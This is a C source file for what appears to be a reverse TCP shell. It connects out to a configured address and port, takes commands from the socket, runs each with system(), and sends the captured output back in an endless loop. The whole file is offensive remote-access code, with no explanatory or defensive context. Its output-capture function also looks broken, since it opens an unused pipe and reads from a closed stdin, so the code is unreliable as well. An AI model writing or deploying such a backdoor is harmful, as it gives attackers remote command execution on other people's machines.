#include "reversetcp.h"
int shell(char *cmd)
{
	int p[2],newp,pos=0;
	newp = dup(STDOUT_FILENO);

	close(STDIN_FILENO);
	close(STDOUT_FILENO);

	pipe(p);

	system(cmd);

	dup2(newp, STDOUT_FILENO);

	while(1){
		stdin_output[pos] = fgetc(stdin);
		if(stdin_output[pos]==EOF){
			break;
		}
		pos++;
	}
}

int main(int argc,char *argv[])
{
	setlocale(LC_ALL,"");
	char buffer[300];
	struct sockaddr_in extern_struct;
	extern_struct.sin_family = AF_INET;
	extern_struct.sin_addr.s_addr = inet_addr(ADDRESS);
	extern_struct.sin_port = htons(atoi(PORT));
	memset(extern_struct.sin_zero,0,sizeof(extern_struct.sin_zero));
	if((inet_aton(ADDRESS,&extern_struct.sin_addr))==0)
	{
		printf("addr: crash! restart the program\n");
	}
	externfd = socket(AF_INET,SOCK_STREAM,0);
	if(externfd == -1)
	{
		printf("socket: crash! restart the program\n");
		exit(1);
	}
	if(connect(externfd,(struct sockaddr *) &extern_struct,sizeof(extern_struct))==-1)
	{
		printf("connect: crash! restart the program\n");
		exit(1);
	}
	printf("\n");
	while(1)
	{
		recv(externfd,buffer,sizeof(buffer),0);
		memset(stdin_output,0,sizeof(stdin_output));
		shell(buffer);
		send(externfd,stdin_output,sizeof(stdin_output),0);
		memset(stdin_output,0,sizeof(stdin_output));
	}
	close(externfd);
}
